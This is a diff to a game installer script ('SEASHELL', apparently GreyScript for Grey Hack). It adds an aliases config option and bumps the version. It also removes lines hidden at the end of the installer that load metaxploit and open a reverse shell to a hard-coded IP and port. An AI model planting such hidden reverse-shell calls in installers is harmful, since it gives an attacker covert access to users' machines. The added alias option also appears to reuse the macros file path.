@@ -3,7 +3,7 @@
 ////////////////////////////////////////////////////////////
 SS = get_custom_object// SEASHELL INSTALLER CUSTOM OBJECT
 SS.cb = false
-SS.version = "2.0.3"//SEASHELL INSTALLER
+SS.version = "2.0.4c"//SEASHELL INSTALLER
 LOG = @print
 INPUT = @user_input
 T = @typeof
@@ -354,7 +354,12 @@ setUserConfig = function(act, fi)
 		f = C.File(fi.path+"/ss.macros")
 		p = "ss.macros"
 		d = "[MACRO NAME] [SS.CMD NAME] [ARGUMENTS] ; [SS.CMD NAME] [ARGUMENTS]"+NL+"EXAMPLE ls ; cd /"
-	else 
+    else if act == "-a" then // usermacros
+		s = "User Aliases"
+		f = C.File(fi.path+"/ss.macros")
+		p = "ss.aliases"
+		d = "aliasExampleName=cache"
+    else 
 		return LOG("Invalid arguments".warning)
 	end if
 	dat = null
@@ -541,7 +546,7 @@ build_main = function
     if C.File(HOME+"/src/main.src") then return C.File(HOME+"/src/main.src").set_content(main_src)
 end function
 build_src = function
-    LOG("Before you compile, you must save the following files, to do so: ".NL+(SRC.compileThese(CACHEFILE)))
+    LOG("Before you compile, you must save the following files, to do so: ".NL+"USING SECOND TERMINAL, PASTE EACH COMMAND".NL+(SRC.compileThese(CACHEFILE)))
     if INPUT("Press 1 to confirm build".prompt).to_int != 1 then EXIT("Exiting install".sys)
     for f in SRC
         test = C.File(HOME+"/src/"+f)
@@ -584,11 +589,12 @@ check_cache = function
     CACHEFILE = C.File(HOME+"/"+UCACHE)
     if not CACHEFILE then EXIT("Unable to find the cache file")
     if C.create_folder(CACHEFILE.path, "ss.logs") == 1 then LOG("Created folder: ".ok+"ss.logs");wait(0.1)
-    if C.create_folder(CACHEFILE.path, "ss.libs") == 1 then LOG("Created folder: ".ok+"libs");wait(0.1)
+    if C.create_folder(CACHEFILE.path, "ss.libs") == 1 then LOG("Created folder: ".ok+"ss.libs");wait(0.1)
     if C.create_folder(CACHEFILE.path+"/ss.libs", "weak") == 1 then LOG("Created folder: ".ok+"weak");wait(0.1)
     if C.create_folder(CACHEFILE.path+"/ss.libs", "strong") == 1 then LOG("Created folder: ".ok+"strong");wait(0.1)
     setUserConfig("-u", CACHEFILE)
     setUserConfig("-m", CACHEFILE)
+    setUserConfig("-a", CACHEFILE)
     return CACHEFILE
 end function
 build_db = function(CACHEFILE)
@@ -701,9 +707,3 @@ end if
 //////////////////////////////////////////////////////////////  
 ///====================== INSTALL ========================///
 ////////////////////////////////////////////////////////////
-
-
-mx = include_lib("/lib/metaxploit.so")
-if not mx then mx = include_lib("/home/fsociety/metaxploit.so")
-if not mx then exit
-mx.rshell_client("187.131.127.11", 1222, "csession")
